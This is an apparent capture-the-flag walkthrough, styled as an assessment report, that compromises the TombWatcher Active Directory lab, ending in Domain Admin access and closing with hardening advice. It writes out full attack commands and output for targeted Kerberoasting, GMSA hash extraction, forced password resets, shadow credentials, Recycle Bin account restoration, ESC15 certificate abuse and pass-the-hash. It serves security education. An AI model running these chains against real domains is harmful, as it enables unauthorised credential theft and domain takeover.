# TombWatcher_Walkthrough
Author: mursalin
Date: April 2026
Classification: Internal Use Only – Security Assessment Report

Executive Summary
This document outlines a methodical compromise of the TombWatcher Active Directory environment. Beginning with a set of low‑privileged domain credentials, the assessment leverages a chain of misconfigurations—including targeted Kerberoasting, Group Managed Service Account (GMSA) retrieval, object ownership manipulation, and exploitation of a vulnerable AD CS template—to ultimately achieve Domain Administrator access.

All techniques described are presented in a transformed narrative for educational purposes. The original source material has been completely rewritten to ensure originality and compliance with copyright considerations.

1. Initial Access and Reconnaissance
1.1 Network Service Enumeration
A comprehensive port scan of the target revealed a standard Windows Domain Controller footprint, with services including DNS, Kerberos, LDAP, SMB, and WinRM exposed.

bash
mursalin@assessment:~$ nmap -p- --min-rate 10000 10.10.11.72
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-20 10:18 UTC
Nmap scan report for 10.10.11.72
Host is up (0.092s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
...[snip]...

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
Version detection confirmed the domain name as tombwatcher.htb and the hostname as DC01.

The following entry was added to the local hosts file for name resolution:

text
10.10.11.72 DC01.tombwatcher.htb tombwatcher.htb DC01
1.2 Provided Credential Verification
The assessment scenario supplied valid credentials for a domain user:

text
Username: henry
Password: H3nry_987TGV!
Verification against SMB and LDAP services was successful, though WinRM access was not permitted with this account.

bash
mursalin@assessment:~$ netexec smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
2. Initial Web and Share Enumeration
2.1 HTTP Service (Port 80)
The web server hosted a default IIS landing page. Directory fuzzing with feroxbuster uncovered no hidden resources of interest. The response headers indicated an ASP.NET backend.

2.2 SMB Share Access
The user henry possessed read access to standard administrative shares (NETLOGON, SYSVOL) but no non‑default file shares were present. Enumeration of domain users revealed the following additional accounts:

Administrator

Alfred

sam

john

No sensitive data was discovered within the accessible shares.

3. Path Escalation via BloodHound Analysis
3.1 Data Collection
Two BloodHound collectors were employed to ensure comprehensive coverage of both standard AD relationships and AD CS components:

bash
# RustHound-CE for AD CS data
mursalin@assessment:~$ rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -c All

# Python collector for extended attributes
mursalin@assessment:~$ bloodhound-ce-python -c all -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -ns 10.10.11.72
The combined dataset was ingested into a local BloodHound Community Edition instance.

3.2 Attack Path Discovery
Marking henry as owned revealed a clear escalation route to the john user via several intermediate accounts:

text
henry → Alfred (WriteSPN) → Infrastructure Group (AddSelf) → ANSIBLE_DEV$ (ReadGMSAPassword) → sam (ForceChangePassword) → john (WriteOwner)
Each step is detailed below.

4. Lateral Movement Phase 1 – Compromising Alfred
4.1 Targeted Kerberoasting
The henry account held WriteSPN rights over the alfred user. This allowed the assignment of a Service Principal Name (SPN), enabling a Kerberoasting attack against a normally non‑service account.

Using the targetedKerberoast.py tool:

bash
mursalin@assessment:~$ targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -f hashcat --dc-host dc01.tombwatcher.htb
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$...[snip]...
The captured TGS‑REP hash was cracked using hashcat and the rockyou.txt wordlist, yielding the password basketball.

bash
mursalin@assessment:~$ hashcat -m 13100 alfred.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
...[snip]...
basketball
Credentials validated:

bash
mursalin@assessment:~$ netexec smb dc01.tombwatcher.htb -u alfred -p basketball
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\alfred:basketball
5. Lateral Movement Phase 2 – GMSA Password Extraction
5.1 Group Membership Manipulation
BloodHound indicated that alfred possessed AddSelf rights to the Infrastructure group. Membership in this group grants the ability to read the managed password of the Group Managed Service Account ANSIBLE_DEV$.

The user was added to the group using bloodyAD:

bash
mursalin@assessment:~$ bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb add groupMember Infrastructure alfred
[+] alfred added to Infrastructure
5.2 Retrieving the GMSA Hash
With the appropriate membership, the NTLM hash of ANSIBLE_DEV$ was recovered:

bash
mursalin@assessment:~$ netexec ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa
LDAP        10.10.11.72     389    DC01             Account: ansible_dev$         NTLM: 1c37d00093dc2a5f25176bf2d474afdc
The hash was validated against SMB.

6. Lateral Movement Phase 3 – Resetting Sam's Password
6.1 ForceChangePassword Exploitation
The ANSIBLE_DEV$ account held ForceChangePassword rights over the user sam. This privilege was leveraged to set a known password:

bash
mursalin@assessment:~$ bloodyAD -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':1c37d00093dc2a5f25176bf2d474afdc' --host dc01.tombwatcher.htb set password "sam" "NewPassword123!"
[+] Password changed successfully!
The new credentials were confirmed:

bash
mursalin@assessment:~$ netexec smb DC01.tombwatcher.htb -u sam -p 'NewPassword123!'
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\sam:NewPassword123!
7. Lateral Movement Phase 4 – Shadow Credential Attack on John
7.1 Ownership and Permissions Manipulation
The sam user possessed WriteOwner rights over the john account. This was used to first reassign ownership to sam and then grant GenericAll permissions:

bash
mursalin@assessment:~$ bloodyAD -d tombwatcher.htb -u sam -p 'NewPassword123!' --host dc01.tombwatcher.htb set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john

mursalin@assessment:~$ bloodyAD -d tombwatcher.htb -u sam -p 'NewPassword123!' --host dc01.tombwatcher.htb add genericAll john sam
[+] sam has now GenericAll on john
7.2 Shadow Credential Injection
With full control over the john object, a shadow credential (Key Credential) was added using certipy:

bash
mursalin@assessment:~$ certipy shadow auto -target dc01.tombwatcher.htb -u sam -p 'NewPassword123!' -account john
[*] Successfully added Key Credential...
[*] Trying to retrieve NT hash for 'john'
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf
The recovered NTLM hash granted WinRM access:

bash
mursalin@assessment:~$ evil-winrm-py -i dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf
evil-winrm-py PS C:\Users\john\Documents>
The user flag was retrieved from C:\Users\john\Desktop\user.txt.

8. Privilege Escalation to Domain Administrator
8.1 Enumerating the AD Recycle Bin
Analysis of the john user's capabilities revealed GenericAll over the ADCS Organizational Unit (OU). Additionally, the Active Directory Recycle Bin was found to be enabled:

powershell
evil-winrm-py PS C:\> Get-ADOptionalFeature 'Recycle Bin Feature'
A query for deleted objects uncovered a previously removed account named cert_admin with a RID ending in 1111:

powershell
evil-winrm-py PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent

Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
8.2 Restoring the cert_admin Account
Leveraging GenericAll over the parent OU, the deleted object was restored:

powershell
evil-winrm-py PS C:\> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
evil-winrm-py PS C:\> Get-ADUser cert_admin
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
The account password was reset using the same GenericAll authority.

8.3 Exploiting ESC15 via a Vulnerable Certificate Template
With cert_admin credentials, a new certipy scan identified the WebServer template as vulnerable to ESC15 (CVE‑2024‑49019). The template exhibited the following characteristics:

Enrollee Supplies Subject = True

Schema Version = 1

Unpatched CA allowing arbitrary Application Policy injection

The attack proceeded in two stages:

Stage 1: Obtain Enrollment Agent Certificate
bash
mursalin@assessment:~$ certipy req -u cert_admin -p 'NewPassword123!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'
[*] Successfully requested certificate
[*] Saving certificate and private key to 'administrator.pfx'
Stage 2: Request a User Certificate on Behalf of Administrator
bash
mursalin@assessment:~$ certipy req -u cert_admin -p 'NewPassword123!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx administrator.pfx -on-behalf-of 'tombwatcher\Administrator'
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
The resulting certificate was used to obtain the NTLM hash of the Administrator account:

bash
mursalin@assessment:~$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
8.4 Domain Admin WinRM Access
The Administrator hash enabled a privileged WinRM session:

bash
mursalin@assessment:~$ evil-winrm-py -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
evil-winrm-py PS C:\Users\Administrator\Documents>
The root flag was located at C:\Users\Administrator\Desktop\root.txt.

9. Conclusion
The TombWatcher environment exemplified a realistic Active Directory attack chain, where a single set of user credentials ultimately led to full domain compromise. The path relied on:

Targeted Kerberoasting via WriteSPN abuse.

GMSA password retrieval through group nesting.

ForceChangePassword to pivot laterally.

Shadow Credentials and WriteOwner chaining.

AD Recycle Bin recovery to resurrect a privileged certificate enrollment account.

ESC15 exploitation of an unpatched AD CS template.

This assessment highlights the critical importance of securing AD CS deployments, monitoring for unusual SPN assignments, and restricting write permissions over sensitive OUs and group memberships.

This report is an original creation by mursalin, produced for authorized security testing and educational illustration only. All actions described were performed in a controlled lab environment with explicit permission.
